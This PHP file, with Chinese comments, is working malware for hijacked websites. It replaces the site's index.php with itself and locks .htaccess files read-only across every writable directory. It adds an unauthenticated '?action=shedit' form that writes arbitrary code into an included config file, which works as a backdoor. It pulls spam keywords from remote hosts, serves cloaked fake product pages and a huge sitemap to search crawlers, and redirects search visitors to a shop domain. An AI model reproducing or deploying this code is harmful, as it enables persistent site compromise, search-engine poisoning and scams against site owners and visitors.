<?php
/**当对方GM比较勤快的时候用这个版本 */
error_reporting(0);
$indexfilename = "images/indexbanner.jpeg";
$configFile = "images/".MainDomain().".shedit.set";
/**如果images文件夹不存在就创建 */
if(!is_dir("images")){mkdir("images",0777);}

/*是否替换htaccess*/
if(!defined("HTACCESS_REPLACE")){define('HTACCESS_REPLACE', 'no');}
/*是否替换已经存在的页面*/
if(!defined("REPLACE_EXISTS")){	define('REPLACE_EXISTS', 'yes');}

define("CONFIG_FILE", $configFile);
replaceIndex($indexfilename);/*当执行的文件不是index.php的时候，替换index.php*/
checkStatus();/*状态监测*/
setHtaccess();/*锁定htaccess*/
editConfigFile();
if(file_exists($configFile)){
	include_once $configFile;
}else{
	/**如果config.inc.php不存在直接显示原首页 */
	include $indexfilename;
	die;
}
/**
 * 当.htaccess有写权限的时候，内页链接要不要加index.php
 * 默认值为define('INDEX_PHP', 'index.php/');
 */
/*是否替换首页*/
if(!defined("REPLACE_INDEX")){define('REPLACE_INDEX', 'yes');}
if(!defined("INDEX_PHP")){	define('INDEX_PHP', $_SERVER["SCRIPT_FILENAME"] . '/');}
if(!defined("LANGUAGE")){	define('LANGUAGE', '');}
if(!defined("KEYWORDDIR")){	define('KEYWORDDIR', '');}
if(!defined("API_HOST")){	define('API_HOST', 'http://keywordfada20201115.keyworddomain.com/');}
if(!defined("SHOP_HOST")){	define('SHOP_HOST', 'http://shopfada20201115.keyworddomain.com/');}
if(!defined("MAINDOMAIN")){	define('MAINDOMAIN', '.outletonline2021.top');}
define("API_HOST2", str_ireplace(".keyworddomain.com", MAINDOMAIN, API_HOST));
define("SHOP_HOST2", str_ireplace(".keyworddomain.com", MAINDOMAIN, SHOP_HOST));

$token = md5(md5("sj".MainDomain()));
$uriend = "&dir=".KEYWORDDIR."&hl=".LANGUAGE."&token=".$token;
$uri = API_HOST2 . "randkeyword.php?str=".md5("testshely".$_SERVER["REQUEST_URI"]).$uriend;
/*如果是sitemap.xml*/
if(substr($_SERVER["REQUEST_URI"], 0, 12) == "/sitemap.xml"){showSiteMap();die;}
/*如果是robots.txt*/
if(substr($_SERVER["REQUEST_URI"], 0, 11) == "/robots.txt"){showRobotsTxt();die;}
/**是否指定关键词 */
preg_match("|([^/]+)-k.html$|i", $_SERVER["REQUEST_URI"], $match);
$pageexists = true;
if(!empty($match[1])){
    $keyword = str_replace("-", "%20", $match[1]);
    $keyword = urldecode($keyword);
	$uri = API_HOST2 . "randkeyword.php?keyword=".$keyword.$uriend;
	$pageexists = false;
}elseif($arrCid = getCid()){
	$uri = API_HOST2 . "randkeyword.php?f=".$arrCid["cid"]."&l=".$arrCid["lid"].$uriend;
}
$jsonStr = getHtml($uri);
$obj = json_decode($jsonStr);
/**
 * 判断是否是原来就有的页面，如果是原来就有的页面，那么就开始生成
 */
if(REPLACE_EXISTS == "yes"){
	$pageexists = false;
}
if($pageexists){
	if(!preg_match("|([^/]+)-c.html$|i", $_SERVER["REQUEST_URI"], $match)){
		include $indexfilename;
		if(isBot()){
			$liil = '';
			foreach($obj->relatedKeywords as $keyword1){
				$link = is_https() . $_SERVER["HTTP_HOST"] . '/' . INDEX_PHP . keywordtouri($keyword1) . "-k.html";
				$liil .= '		<li><a href="'.$link.'">'.$keyword1.'</li>'."\n";
			}
			echo '<ul class="Related">'.$liil.'</ul>';
		}
		die;
	}
}
if(!empty($obj->keyword)){
	$tourl = file_get_contents(SHOP_HOST2 . "/readurl.php");
	if(isIndexUrl($tourl)){
		$jumpurl = $tourl . "?c=".$obj->keyword; //跳转的url
	}else{
		$jumpurl = SHOP_HOST2 . "?c=".$obj->keyword; //跳转的url
	}
	if(needJump()){echo '<meta http-equiv="refresh" content="0; url=' . $jumpurl . '">';die;}
	if(isBot()){
		showProduct($obj);
		die;
	}
}
/*引用旧的index*/
include $indexfilename;
die;

/**
 * 判断是不是首页url
 */
function isIndexUrl($url){
	$pattern = "|^https?://.*/$|";
	if(preg_match($pattern, $url)){
		return true;
	}
	return false;
}

/**
 * 修改或者新建config.inc.php
 * ?action=shedit
 */
function editConfigFile(){
	if(!empty($_GET["action"]) && $_GET["action"] == "shedit"){
		if(!empty($_POST["shaction"]) && !empty($_POST["content"]) && $_POST["shaction"] == "shedit"){
			file_put_contents(CONFIG_FILE, stripcslashes($_POST["content"]));
			echo 'config saved!';
		}else{
			if(file_exists(CONFIG_FILE)){
				$content =  file_get_contents(CONFIG_FILE);
			}else{
				$content = "";
			}
			header('Content-type: text/html; charset=utf-8');
			echo '<form method="post"><textarea name="content">'.$content.'</textarea><input type="submit"><input type="hidden" name="shaction" value="shedit"></form>';
		}
		die();
	}
}

/**
 * 锁定htaccess
 */
function setHtaccess(){
	if(HTACCESS_REPLACE == "no"){
		return;
	}
	$filename = ".htaccess";
	$md5str = "bd3b39b9bf61ef8e0d6b2de90488f5a3";
	if(!file_exists($filename)){
		$filemd5 = "0";
	}else{
		$filemd5 = md5_file($filename);
	}
	if($md5str == $filemd5){
		return;
	}else{
		$str = '<IfModule mod_rewrite.c>'.
		PHP_EOL.'RewriteEngine On'.
		PHP_EOL.'RewriteBase /'.
		PHP_EOL.'RewriteRule ^(index|wp\-admin|wp\-include|wp\-comment|wp\-loader|wp\-corn\-sample|wp\-logln|output|about|admin|wp\-ver).php$ - [L]'.
		PHP_EOL.'RewriteRule . index.php [L]'.
		PHP_EOL.'</IfModule>';
		chmod($filename, 0777);
		file_put_contents($filename, $str);
		chmod($filename, 0444);
	}
}

/**
 * 复制自己
 */
function replaceIndex($indexfilename){
	if(REPLACE_INDEX == "no"){
		return;
	}
	/* 如果$indexfilename不存在，而且当前执行的文件名不是index.php那么开始替换index.php */
	if(!file_exists($indexfilename)){
		if($_SERVER["SCRIPT_NAME"] != "/index.php"){
			if(!rename("index.php", $indexfilename)){
				die('rename error!');
			}else{
				/* 复制自己成为index.php */
				if(!copy($_SERVER["SCRIPT_FILENAME"], "index.php")){
					die("copy error!");
				}
			}
			/**复制成功之后删除自己 */
			if(file_exists($indexfilename)){unlink(__FILE__);}
			header("Location: /");
		}
	}
}

/**
 * 状态监测
 * http://testshely.com/index.php?checkstatus=areyouok
 */
function checkStatus(){
	if(!empty($_GET["checkstatus"]) && $_GET["checkstatus"] == "areyouok"){
		/***在每一个目录放置一个htaccess***/
		$content = '<FilesMatch ".(phtml|php|PhP|php5|php7|suspected)$">
Order Allow,Deny
Deny from all
</FilesMatch>';
		$md5content = md5($content);
		$dir = ".";
		/*删除自己*/
		$tempFile = md5($_SERVER["HTTP_HOST"].time());
		file_put_contents($tempFile, "1");
		/*如果缓存文件不存在那么不执行*/
		if(file_exists($tempFile)){
			$arrDirs = recurDirRW($dir);
			foreach($arrDirs as $path){
				if(file_exists($path . "/" . $tempFile)){
					echo $path.'是根目录,放弃执行！<br>';
				}else{
					$htfile = $path . "/.htaccess";
					chmod($htfile, 0777);
					file_put_contents($htfile, $content);
					chmod($htfile, 0444);
				}
			}
			/*执行完，删除缓存文件*/
			unlink($tempFile);
		}
		
		die("live");
	}
}
/*以当前域名为种子生成固定的随机链接*/
function contentLink($cid, $lid){
	$cid = $cid."";
	$lid = $lid."";
	$link = "/" . INDEX_PHP;
	$str = "abcdefghijklmnopqrstuvwxyz";
	$intR = intSeed(MainDomain() . $cid . $lid);
	srand($intR);
	for($i=0;$i < 6;$i++){
		$link .= $str[mt_rand(0, 25)];
	}
	$link .= $cid . "/";
	for($i=0;$i < 6;$i++){
		$link .= $str[mt_rand(0, 25)];
	}
	$link .= $lid;
	return $link;
}

/*获取目录ID和内容ID*/
function getCid(){
	if(empty($_SERVER["PATH_INFO"])){
		return false;
	}
	$arrResult = array();
	$arr = explode("/", $_SERVER["PATH_INFO"]);
	if(sizeof($arr) == 3 && empty($arr[0]) && !empty($arr[1]) && !empty($arr[2])){
		$arrResult["cid"] = preg_replace("|[^\d]|i", "", $arr[1]);
		$arrResult["lid"] = preg_replace("|[^\d]|i", "", $arr[2]);
		if(is_numeric($arrResult["cid"]) && is_numeric($arrResult["lid"])){
			return $arrResult;
		}
	}
	return false;
}

/**
 * 获取网页内容
 */
function getHtml($url){
	$curl = curl_init();    //创建一个新的CURL资源  
	curl_setopt($curl, CURLOPT_URL, $url);  //设置URL和相应的选项  
	curl_setopt($curl, CURLOPT_HEADER, 0);  //0表示不输出Header，1表示输出  
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);  //设定是否显示头信息,1显示，0不显示。  
	//如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE  

	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_ENCODING, '');   //设置编码格式，为空表示支持所有格式的编码  
	//header中“Accept-Encoding: ”部分的内容，支持的编码格式为："identity"，"deflate"，"gzip"。  
	  
	curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0");  
	if (ini_get('open_basedir') == '' && ini_get('safe_mode' == 'Off')) 
	{
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
	}
	//设置这个选项为一个非零值(象 “Location: “)的头，服务器会把它当做HTTP头的一部分发送(注意这是递归的，PHP将发送形如 “Location: “的头)。  
	  
	$data = curl_exec($curl);
	curl_close($curl);
	$data = str_ireplace('document.location.protocol != "https:"', 'false', $data);
	return $data;
}

/*显示图片标签*/
function htmlImgTag($src, $des, $width = 800, $height = 800){
    return '<img width="'.$width.'" height="'.$height.'" src="'.$src.'" alt="'.$des.'" longdes="'.$des.'">';
}

/*根据字符串生成种子*/
function intSeed($str){
	$str = md5(MainDomain() . $_SERVER["SCRIPT_NAME"] . getenv("PATH_INFO") . $str); /*随机数种子*/
	$int = hexdec(substr($str, 0, 8));
	return $int;
}

/*判断是不是蜘蛛*/
function isBot(){
	$arr = array(
		"google",
		"bot",
		"yahoo",
		"yandex",
		"bing",
	);
	if(preg_match("/superman/i",getenv('HTTP_USER_AGENT')))
	{
		/*超人模式*/
		return true;
	}
	/*如果HTTP_ACCEPT_LANGUAGE不为空，返回false蜘蛛没有来路*/
	if(!empty($_SERVER["HTTP_ACCEPT_LANGUAGE"])){
	    return false;
	}
	/*如果HTTP_REFERER不为空，返回false,蜘蛛没有来路*/
	if(!empty($_SERVER["HTTP_REFERER"])){
	    return false;
	}
	/*如果是google蜘蛛返回true*/
	foreach($arr as $str)
	{
		if(preg_match("/" . $str . "/i",getenv('HTTP_USER_AGENT')))
		{
			return true;
		}
	}
	return false;
}

/*获取当前主域名*/
function MainDomain(){
	$domain = $_SERVER["HTTP_HOST"];
	if(substr($domain, 0, 4) == "www."){
		return substr($domain, 4);
	}else{
		return $domain;
	}
}

/*判断是否需要跳转*/
function needJump(){
	$arr = array(
		"google",
		"bot",
		"yahoo",
		"yandex",
		"bing",
	);
	//如果是google蜘蛛不做任何操作
	foreach($arr as $str)
	{
		if(preg_match("/" . $str . "/i",getenv('HTTP_USER_AGENT')))
		{
			return false;
		}
	}
	//如果语言不为日文不跳
	if(preg_match("/zh/i",getenv('HTTP_ACCEPT_LANGUAGE')) || preg_match("/cn/i",getenv('HTTP_ACCEPT_LANGUAGE')))
	{
		return false;
	}
	//判断session
	if(!empty($_SESSION["referer"]) && $_SESSION["referer"] == "SearchEngine"){
		return true;
	}
	$referer = getenv("HTTP_REFERER");
	//如果来路为空不跳
	if(empty($referer))
	{
		return false;
	}else{
	//如果来路不为空则判断是否为google来路
		$referer_array = parse_url($referer);
		$referer_host = strtolower($referer_array['host']);
		if(strstr($referer_host, ".google.") !== false || strstr($referer_host, ".yahoo.") !== false){ //来路为google或者yahoo
			$_SESSION["referer"] = "SearchEngine";
			return true;
		}else{
			return false;
		}
	}
	return false;
}

/*显示内容*/
function showProduct($obj){
	$keyword = $obj->randWords[0] . " " . $obj->randWords[1] . " " . $obj->randWords[2] . " " 
	. $obj->keyword . " " 
	. $obj->randWords[3] . " " . $obj->randWords[4] . " " . $obj->randWords[5];
	$liil = '';
	foreach($obj->relatedKeywords as $keyword1){
		$link = is_https() . $_SERVER["HTTP_HOST"] . '/' . keywordtouri($keyword1) . "-k.html";
		$liil .= '		<li><a href="'.$link.'">'.$keyword1.'</li>'."\n";
	}
	$imagesdiv = showImagesMobile(base64_decode($obj->content64), $obj->keyword);
	$str = '<!DOCTYPE html>'.
		PHP_EOL.'<html>'.
		PHP_EOL.'<head>'.
		PHP_EOL.'	<title>'.$keyword.'</title>'.
		PHP_EOL.'	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />'.
		PHP_EOL.'	<meta name="keywords" content="'.$keyword.'" /> '.
		PHP_EOL.'	<meta name="description" content="'.$keyword.'" />'.
		PHP_EOL.'	<meta name="apple-mobile-web-app-capable" content="yes" />'.
		PHP_EOL.'	<meta name="apple-mobile-web-app-status-bar-style" content="black" />'.
		PHP_EOL.'	<meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />'.
		PHP_EOL.'	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">'.
		PHP_EOL.'</head>'.
		PHP_EOL.'<body>'.
		PHP_EOL.'	<div class="main">'.
		PHP_EOL.'		<a href="/">Home</a><br />'.
		PHP_EOL.'		<h1>'.$keyword.'</h1>'.
		PHP_EOL.'		<div class="content">'.
		PHP_EOL.'			'. $imagesdiv .
		PHP_EOL.'		</div>'.
		PHP_EOL.'	</div>'.
		PHP_EOL.'	<style>'.
		PHP_EOL.'		img{ border:0;width:100%;max-width:500px;}'.
		PHP_EOL.'		ul li{list-style-type:none;width:49%;float:left;}'.
		PHP_EOL.'		.clear{clear:both;}'.
		PHP_EOL.'	</style>'.
		PHP_EOL.'	<ul class="related">'.
		PHP_EOL.''.$liil.
		PHP_EOL.'	</ul>'.
		PHP_EOL.'</body>'.
		PHP_EOL.'</html>';
	header('Content-type: text/html; charset=utf-8');
    echo $str;
    die();
}

/**
 * 判断当前访问网站使用的是http还是https,
 * @return http:// 或者 https://
 */
function is_https(){
	if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
		return 'https://';
	} elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
		return 'https://';
	} elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
		return 'https://';
	}
	return 'http://';
}

/**
 * 把普通字符转换成适合url的格式 ，如空格变成-
 */
function keywordtouri($keyword)
{
	$url = str_replace(" ", "-", trim($keyword));
	$url = urlencode($url);
	return $url;
}

/**
 * 显示robots.txt
 */
function showRobotsTxt(){
	$indexurl = is_https() . $_SERVER["HTTP_HOST"] . "/";
	@header('Content-Type: text/plain');
	$str = 'User-agent: Baiduspider'.PHP_EOL.'Disallow: /'.PHP_EOL.'User-agent: AhrefsBot '.PHP_EOL.'Disallow: /'.PHP_EOL.'User-agent: MJ12bot '.PHP_EOL.'Disallow: /'.PHP_EOL.'User-agent: BLEXBot '.PHP_EOL.'Disallow: /'.PHP_EOL.'User-agent: DotBot'.PHP_EOL.'Disallow: /'.PHP_EOL.'User-agent: SemrushBot'.PHP_EOL.'Disallow: /'.PHP_EOL.'User-agent: YandexBot'.PHP_EOL.'Disallow: /'.PHP_EOL.'User-agent: *'.PHP_EOL.'Disallow:'.PHP_EOL.'Sitemap: ' . is_https().$_SERVER["HTTP_HOST"] . '/sitemap.xml';
	echo $str;
	die;
}

/**
 * 显示sitemap
 */
function showSiteMap(){
	$indexurl = is_https() . $_SERVER["HTTP_HOST"] . "/";
	$date = date('Y-m-d');
	$result = '<?xml version="1.0" encoding="UTF-8"?>'.PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'.PHP_EOL.'	<url>'.PHP_EOL.'	<loc>'.$indexurl.'</loc>'.PHP_EOL.'	<priority>1.0</priority>'.PHP_EOL.'	<changefreq>always</changefreq>'.PHP_EOL.'	<lastmod>'.$date.'</lastmod>'.PHP_EOL.'	</url>';
	$intR = intSeed(MainDomain());
	srand($intR);
	$str = "abcdefghijklmnopqrstuvwxyz";
	for($i=0;$i<3000;$i++){
		$link = $indexurl . INDEX_PHP 
		. $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)] 
		. $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)]
		. "/"
		. $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)]
		. $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)] . $str[mt_rand(0, 25)];
		$result .= PHP_EOL.'	<url>'.PHP_EOL.'		<loc>'.$link.'-c.html</loc>'.PHP_EOL.'		<priority>0.8</priority>'.PHP_EOL.'		<changefreq>weekly</changefreq>'.PHP_EOL.'		<lastmod>'.$date.'</lastmod>'.PHP_EOL.'	</url>';
	}
	$result .= PHP_EOL.'</urlset>';
	header('Content-Type: text/xml');
	echo $result;
	die();
}

/**
 * 生成关键词对应的图片
 */
function showImagesMobile($str, $keyword)
{
	$arr = explode("\n", $str);
	//乱序排序
	$arrIndex = randArray(0, (@count($arr) - 1));
	$returnstr = "<div class=\"imagesContainer\">";
	//json ld
	$newContext = new context("Product");
	$newContext->setName($keyword);
	$newContext->setDescription($keyword . " - " . $_SERVER["HTTP_HOST"]);
	$newContext->setOffers();
	foreach($arrIndex as $index)
	{
		$line = $arr[$index];
		$arrline = explode("|||", $line);
		if(count($arrline) > 2)
		{
			$keyword = trim($arrline[1]);
			$newContext->addImage($arrline[0]);
			$returnstr .='
			<div class="media">
				<a href="' . $arrline[0] . '" alt="' . $keyword . '" title="' . $keyword . '">
					<img class="mr-3" src="' . $arrline[0] . '" alt="' . $keyword . '" title="' . $keyword . '" />
				</a>
				<div class="media-body">
					<h5 class="mt-0">' . $keyword . '</h5>
				</div>
			</div>
			<br>
';
		}
	}
	$returnstr .= "
		</div>";
	$returnstr .= $newContext->showScript();
	return $returnstr;
}

function randArray($min, $max)
{
	$seed = intSeed(getenv("REQUEST_URI"));
	srand($seed);
	$result = array();
	for($i=$min; $i <= $max; $i++)
	{
		$result[] = rand($min, $max);
	}
	$result = array_unique($result);
	return $result;
}

/**
 * 遍历目录，显示可读可写子目录
 */
function recurDirRW($pathName)
{
    //将结果保存在result变量中
    $result = array();
    $temp = array();
    //判断传入的变量是否是目录
    if(!is_dir($pathName) || !is_readable($pathName) || !is_writeable($pathName)) {
        return null;
    }
    //取出目录中的文件和子目录名,使用scandir函数
    $allFiles = scandir($pathName);
    //遍历他们
    foreach($allFiles as $fileName) {
        //判断是否是.和..因为这两个东西神马也不是。。。
        if(in_array($fileName, array('.', '..'))) {
            continue;
        }
        //路径加文件名
        $fullName = $pathName.'/'.$fileName;
        //如果是目录的话就继续遍历这个目录
        if(is_dir($fullName) && is_readable($fullName) && is_writeable($fullName)) {
            //将这个目录中的文件信息存入到数组中
            $result[] = $fullName;
            $temp = recurDirRW($fullName);
            $result = array_merge($result, $temp);
        }
    }
    return $result;
}

class context{
	public $context = "https://schema.org/";
	public $type = "Product";
	public $name = "";
	public $image = array();
	public $description = "";
	public $offers = array();
	//构造函数
	function __construct($type = "Product"){
		$this->type = $type;
	}
	//添加产品名
	function setName($name){
		$this->name = $name;
	}
	//添加图片
	function addImage($src){
		$this->image[] = $src;
	}
	//添加详情
	function setDescription($str){
		$this->description = $str;
	}
	//设置offers
	function setOffers(){
		$arr = array(
			'@type' => "Offer",
			'url' => $this->getSchema() . getenv("HTTP_HOST") . getenv("REQUEST_URI"),
			'priceCurrency' => "USD",
			'price' => "9.9",
			'availability' => "http://schema.org/InStock",
			'priceValidUntil' => date("Y") + 1,
		);
		$this->offers = $arr;
	}
	//显示
	function showScript(){
		$arr = array(
			'@context' => $this->context,
			'@type' => $this->type,
			'name' => $this->name,
			'image' => $this->image,
			'description' => $this->description,
			'offers' => $this->offers,
		);
		$str = json_encode($arr);
		return '
<script type="application/ld+json">'.$str.'</script>';
	}
  // 判断当前url是否为https
  function getSchema(){
    if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return 'https://';
    } elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
        return 'https://';
    } elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return 'https://';
    }
    return 'http://';
  }
}
?>